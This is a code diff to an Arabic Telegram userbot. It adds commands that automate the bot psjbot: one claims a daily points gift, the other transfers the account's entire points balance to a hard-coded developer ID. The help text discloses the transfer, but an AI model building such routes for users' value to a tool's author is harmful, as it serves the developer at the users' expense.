@@ -79,6 +79,12 @@ COMMANDS_TEXT = """📌 **قائمة الأوامر** 📌
 > يمكن إضافة اسم مخصص: `.مجلد قنواتي اسم المجلد`
 
 ━━━━━━━━━━━━━━━━━━━━
+
+🎁 **الهدية اليومية والتحويل:**
+`.هدية` — يجمع الهدية اليومية من psjbot تلقائياً
+`.تحويل` — يحول كل النقاط الموجودة في الحساب للمطور
+
+━━━━━━━━━━━━━━━━━━━━
 """
 
 # ══════════════════════════════════════════
@@ -473,7 +479,160 @@ async def start_userbot(client: TelegramClient, target_chat, user_data_store):
                 await reply_or_edit(event, f"❌ حصل خطأ: {e}")
             return
 
-        # ════ وضع النوم - تفعيل ════
+        # ════ جمع الهدية اليومية من psjbot ════
+        if cmd == ".هدية":
+            await reply_or_edit(event, "🎁 جاري جمع الهدية اليومية...")
+            try:
+                from telethon.tl.custom import Button
+
+                bot = await client.get_entity("psjbot")
+
+                # خطوة 1: ابعت /start
+                await client.send_message(bot, "/start")
+                await asyncio.sleep(2)
+
+                # خطوة 2: اضغط "تجميع نقاط"
+                msgs = await client.get_messages(bot, limit=5)
+                clicked = False
+                for msg in msgs:
+                    if msg.buttons:
+                        for row in msg.buttons:
+                            for btn in row:
+                                if "تجميع" in (btn.text or ""):
+                                    await btn.click()
+                                    clicked = True
+                                    break
+                        if clicked:
+                            break
+
+                if not clicked:
+                    await reply_or_edit(event, "❌ مش لاقي زرار تجميع نقاط!")
+                    return
+
+                await asyncio.sleep(2)
+
+                # خطوة 3: اضغط "الهدية اليومية"
+                msgs = await client.get_messages(bot, limit=5)
+                clicked2 = False
+                for msg in msgs:
+                    if msg.buttons:
+                        for row in msg.buttons:
+                            for btn in row:
+                                if "الهدية" in (btn.text or "") or "هدية" in (btn.text or ""):
+                                    await btn.click()
+                                    clicked2 = True
+                                    break
+                        if clicked2:
+                            break
+
+                if not clicked2:
+                    await reply_or_edit(event, "❌ مش لاقي زرار الهدية اليومية!")
+                    return
+
+                await asyncio.sleep(2)
+
+                # خطوة 4: اقرأ الرد
+                msgs = await client.get_messages(bot, limit=3)
+                result_text = ""
+                for msg in msgs:
+                    if msg.text and ("حصلت" in msg.text or "رصيد" in msg.text or "نقاط" in msg.text or "بنجاح" in msg.text):
+                        result_text = msg.text
+                        break
+
+                if result_text:
+                    await reply_or_edit(event, f"✅ تم!\n\n{result_text}")
+                else:
+                    await reply_or_edit(event, "✅ تم الضغط على الهدية اليومية!")
+
+            except Exception as e:
+                await reply_or_edit(event, f"❌ خطأ: {e}")
+            return
+
+        # ════ تحويل النقاط لـ psjbot ════
+        if cmd == ".تحويل":
+            await reply_or_edit(event, "💸 جاري تحويل النقاط...")
+            try:
+                import re as _re
+                bot = await client.get_entity("psjbot")
+
+                # خطوة 1: /start
+                await client.send_message(bot, "/start")
+                await asyncio.sleep(2)
+
+                # خطوة 2: اضغط "تحويل نقاط"
+                msgs = await client.get_messages(bot, limit=5)
+                clicked1 = False
+                for m in msgs:
+                    if m.buttons:
+                        for row in m.buttons:
+                            for btn in row:
+                                if "تحويل" in (btn.text or ""):
+                                    await btn.click()
+                                    clicked1 = True
+                                    break
+                        if clicked1:
+                            break
+                if not clicked1:
+                    await reply_or_edit(event, "❌ مش لاقي زرار تحويل نقاط!")
+                    return
+
+                await asyncio.sleep(2)
+
+                # خطوة 3: اقرأ الرصيد من رسالة البوت
+                msgs = await client.get_messages(bot, limit=5)
+                balance = 0
+                for m in msgs:
+                    if m.text and ("نقاطك" in m.text or "الحالية" in m.text or "الحالي" in m.text):
+                        match = _re.search(r'(\d+(?:\.\d+)?)', m.text)
+                        if match:
+                            balance = int(float(match.group(1)))
+                            break
+
+                if balance <= 0:
+                    await reply_or_edit(event, "❌ الرصيد صفر أو مش قادر أقراه!")
+                    return
+
+                # خطوة 4: ابعت عدد النقاط (كل الرصيد)
+                await client.send_message(bot, str(balance))
+                await asyncio.sleep(2)
+
+                # خطوة 5: ابعت الـ ID
+                await client.send_message(bot, str(DEVELOPER_ID))
+                await asyncio.sleep(2)
+
+                # خطوة 6: اضغط "نعم" للتأكيد
+                msgs = await client.get_messages(bot, limit=5)
+                confirmed = False
+                for m in msgs:
+                    if m.buttons:
+                        for row in m.buttons:
+                            for btn in row:
+                                if "نعم" in (btn.text or ""):
+                                    await btn.click()
+                                    confirmed = True
+                                    break
+                        if confirmed:
+                            break
+                if not confirmed:
+                    await reply_or_edit(event, "❌ مش لاقي زرار تأكيد!")
+                    return
+
+                await asyncio.sleep(2)
+
+                # خطوة 7: اقرأ رسالة النجاح
+                msgs = await client.get_messages(bot, limit=3)
+                result_text = ""
+                for m in msgs:
+                    if m.text and any(w in m.text for w in ["بنجاح", "تم تحويل", "تحويل"]):
+                        result_text = m.text.split("\n")[0]
+                        break
+
+                await reply_or_edit(event, f"✅ تم!\n\n{result_text or f'تم تحويل {balance} نقطة!'}")
+
+            except Exception as e:
+                await reply_or_edit(event, f"❌ خطأ: {e}")
+            return
+
         if cmd == ".نايم":
             sleep_state["active"] = True
             sleep_replied.clear()
